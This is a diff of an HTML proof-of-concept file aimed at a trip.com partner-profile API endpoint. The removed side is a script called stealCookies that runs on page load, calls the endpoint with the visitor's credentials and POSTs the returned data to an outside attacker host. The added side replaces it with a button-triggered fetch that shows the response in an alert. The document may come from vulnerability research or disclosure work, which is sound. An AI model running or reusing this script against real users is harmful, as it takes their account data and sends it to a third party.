@@ -1,25 +1,23 @@
-<script>
-async function stealCookies() {
-    try {
-        // Make request with current page's cookies
-        const response = await fetch('https://www.trip.com/restapi/soa2/18073/json/queryPartnerProfileDetails', {
-            method: 'GET',
-            cache:'force-cache',
-            credentials: 'include', // Critical - sends current site's cookies
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fetch PoC</title>
+</head>
+<body>
+    <button id="fetchButton">Click Me</button>
+
+    <script>
+        document.getElementById('fetchButton').addEventListener('click', () => {
+            fetch("https://www.trip.com/restapi/soa2/18073/json/queryPartnerProfileDetails", {
+                method: 'GET',
+                cache: 'force-cache' 
+            })
+            .then(response => response.text())
+            .then(body => alert(body))
+            .catch(error => console.error('Error:', error));
         });
-
-        const data = await response.json();
-
-        // Exfiltrate to attacker's server
-        await fetch('https://cvfh8zrh.c5.rs/steal', {
-            method: 'POST',
-            body: JSON.stringify(data)
-        });
-    } catch (error) {
-        console.error('Exploit failed:', error);
-    }
-}
-
-// Trigger on page load
-stealCookies();
-</script>
+    </script>
+</body>
+</html>
